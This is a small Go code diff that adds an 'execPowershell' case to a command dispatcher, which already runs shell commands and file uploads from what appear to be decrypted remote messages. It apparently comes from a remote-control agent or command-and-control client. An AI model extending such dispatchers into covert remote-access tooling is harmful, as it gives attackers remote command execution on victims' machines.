@@ -17,6 +17,9 @@ func Start() {
 			case "execShell":
 				go shellCmd(sendUserId, decData)
 				break
+			case "execPowershell":
+				go powershellCmd(sendUserId, decData)
+				break
 			case "fileUpload":
 				go fileUploadCmd(sendUserId, decData)
 				break
